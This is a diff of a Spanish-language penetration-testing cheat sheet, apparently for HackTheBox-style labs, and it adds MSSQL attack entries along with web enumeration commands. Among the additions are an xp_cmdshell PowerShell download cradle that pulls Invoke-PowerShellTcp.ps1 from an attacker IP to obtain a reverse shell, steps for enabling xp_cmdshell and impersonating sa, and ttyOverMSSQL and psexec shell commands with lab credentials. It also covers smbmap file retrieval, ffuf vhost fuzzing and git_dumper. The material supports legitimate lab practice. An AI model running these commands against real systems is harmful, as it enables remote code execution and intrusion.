@@ -532,7 +532,8 @@ Protocolo: "SMB"
 Herramienta: "smbmap"
 Descripcion: Listar de forma recursiva todos los recursos que estan bajo el dominio que especifiquemos   
 Comando: smbmap -d dominio -H 10.10.10.100 -r recurso_compartido
-smbmap -d active.htb -H 10.10.10.100 -r Replication -A Group.xml -q -> Buscar de forma recursiva pero descargar el archivo Group.xml cuando lo encuentre 
+smbmap -d active.htb -H 10.10.10.100 -r Replication -A Group.xml -q 
+NOTA: Si se quieren descargar muchos archivos en un solo comando buscar una palabra clave que tengan para que haga match  
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Active Directory"
 Protocolo: "SMB"
@@ -617,7 +618,7 @@ Comando: nmap -p 6379 10.10.10.160 --script redis-info
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Redis"
 Protocolo: "Redis"
-Herramienta: "Redis"
+Herramienta: "redis"
 Descripcion: Explotacion de Redis
 Comando: 
 El objetivo es poner una llave asimetrica en la memoria del servidor redis y transferirla a un archivo de manera que el archivo authorized_keys aun sea valido
@@ -1112,18 +1113,57 @@ Herramienta: "psexec"
 Descripcion: Iniciar sesion por smb cuando marque un pwned
 Comando: impacket-psexec WORKGROUP/Administrator@10.10.110.213 cmd.exe
 ------------------------------------------------------------------------------------------------------------------------------------
-Categoria: "SQL"
-Protocolo: "SQL"
+Categoria: "MSSQL"
+Protocolo: "MSSQL"
 Herramienta: "sqsh"
-Descripcion: Conectarse con el servicio SQL
+Descripcion: Conectarse con el servicio MSSQL
 Comando: sqsh -S 10.10.110.58 -U 'sa' 
 ------------------------------------------------------------------------------------------------------------------------------------
-Categoria: "SQL"
-Protocolo: "SQL"
+Categoria: "MSSQL"
+Protocolo: "MSSQL"
+Herramienta: "invoke"
+Descripcion: Generar una reverse shell desde el servicio MSSQL
+Comando: xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.16.73/Invoke-PowerShellTcp.ps1\")"
+NOTA: Colocar un servidor temporal donde este el archivo Invoke-PowerShellTcp.ps1 y en otra terminal un listener por el puerto especificado 
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "MSSQL"
+Protocolo: "MSSQL"
 Herramienta: "impacket"
-Descripcion: Conectarse con el servicio SQL mediante mssqliclient.py
+Descripcion: Conectarse con el servicio MSSQL mediante mssqliclient.py
 Comando: python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py WORKGROUP/sa:x5Chuz8XbM@10.10.110.58
 ------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "MSSQL"
+Protocolo: "MSSQL"
+Herramienta: "ttyOverMSSQL"
+Descripcion: Obtener una blind shell
+Comando: python3 ttyOverMSSQL.py -s 10.10.11.51 -u sa -p 'MSSQLP@ssw0rd!' --powershell
+NOTA: Se necesitan credenciales validas, el script intenta habilitar xp_cmdshell por default
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "MSSQL"
+Protocolo: "MSSQL"
+Herramienta: "sql"
+Descripcion: Impersonar al usuario sa
+Comando: 
+1. SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
+2. EXECUTE AS LOGIN = 'sa' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "MSSQL"
+Protocolo: "MSSQL"
+Herramienta: "impacket"
+Descripcion: Ejecutar comandos mediante xp_cmdshell
+Comando: xp_cmdshell "whoami"
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "MSSQL"
+Protocolo: "MSSQL"
+Herramienta: "impacket"
+Descripcion: Habilitar xp_cmdshell 
+Comando: 
+1. sp_configure "xp_cmdshell", 1
+NOTA: en caso de mostrar un error nuevamente habilitar las opciones avanzadas e intentar habilitar xp_cmdshell nuevamente
+1. sp_configure "show advanced options", 1
+2. reconfigure
+3. sp_configure "xp_cmdshell", 1
+-----------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Transferencia de archivos"
 Protocolo: "Windows"
 Herramienta: "certutil"
@@ -1509,5 +1549,18 @@ Comando:  john --wordlist=/usr/share/wordlists/rockyou.txt miHash
 Categoria: "wifi"
 Protocolo: "wifi"
 Herramienta: "wifite"
-Descripcion: "Herramienta automatizada para auditorias wifi"
+Descripcion: Herramienta automatizada para auditorias wifi
 Comando: wifite
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "web"
+Protocolo: "HTTP"
+Herramienta: "ffuf"
+Descripcion: Búsqueda de virtual hosts
+Comando: ffuf -w /opt/subdomains-top1million-5000.txt:FUZZ -u http://linkvortex.htb/ -H 'Host: FUZZ.linkvortex.htb' -fs 230
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "git"
+Protocolo: "HTTP"
+Herramienta: "git_dumper"
+Descripcion: Dumpear un archivo .git para ver su contenido
+Comando: ./git_dumper.py http://dev.linkvortex.htb/ output
+NOTA: Esto es util cuando se encuentra un archivo .git en el servidor web
